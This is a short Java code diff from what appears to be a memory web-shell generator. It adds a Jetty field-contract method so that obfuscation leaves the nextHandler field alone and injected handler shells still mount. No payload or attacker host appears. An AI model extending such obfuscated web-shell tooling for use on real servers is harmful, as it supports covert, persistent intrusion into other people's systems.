@@ -7,6 +7,7 @@ import com.reajason.javaweb.asm.MethodUtils;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
+import com.reajason.javaweb.memshell.obfuscation.FieldContracts;
 import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
 import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
 import com.reajason.javaweb.memshell.server.AbstractServer;
@@ -51,6 +52,17 @@ public class Jetty extends AbstractServer {
             return MethodContracts.JETTY_HANDLER_CONTRACTS;
         }
         return super.getShellMethodContracts(shellType);
+    }
+
+    /**
+     * JettyHandlerInjector 注入后按名反射回填 {@code nextHandler}；字段名被混淆后马挂载失败。
+     */
+    @Override
+    public Set<String> getShellFieldContracts(String shellType) {
+        if (HANDLER.equals(shellType) || JAKARTA_HANDLER.equals(shellType)) {
+            return FieldContracts.JETTY_HANDLER_FIELDS;
+        }
+        return super.getShellFieldContracts(shellType);
     }
 
     /**
